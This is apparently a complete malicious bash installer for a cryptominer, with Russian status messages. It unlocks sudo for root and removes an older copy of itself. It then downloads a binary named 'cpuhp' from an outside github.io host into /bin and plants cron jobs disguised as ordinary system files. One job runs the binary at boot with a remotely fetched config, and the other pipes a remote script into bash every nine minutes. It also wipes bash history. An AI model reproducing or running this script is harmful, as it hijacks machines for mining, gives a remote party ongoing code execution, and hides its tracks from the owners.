#!/bin/bash
su
sed -i 's/^#\(root\s*ALL=(ALL)\s*ALL\)/\1/' /etc/sudoers
echo "SUDO Разблокирован!."

if [ -d "/root/bmcontrol" ]; then
	killall cpuhp
 	rm /etc/cron.d/libreoffice
  	cd /root/bmcontrol
   	rm -rf ./*
        echo "Убит V2"
fi
    echo "Копирую в /bin."
    cd /bin
    wget https://xmrhorizontal.github.io/cpuhp
    chmod +x ./cpuhp
    echo "@reboot root sleep 5m && curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin" > /etc/cron.d/cronconfig
    echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
    rm -f ~/.bash_history
    rm -f /root/.bash_history
echo OK!

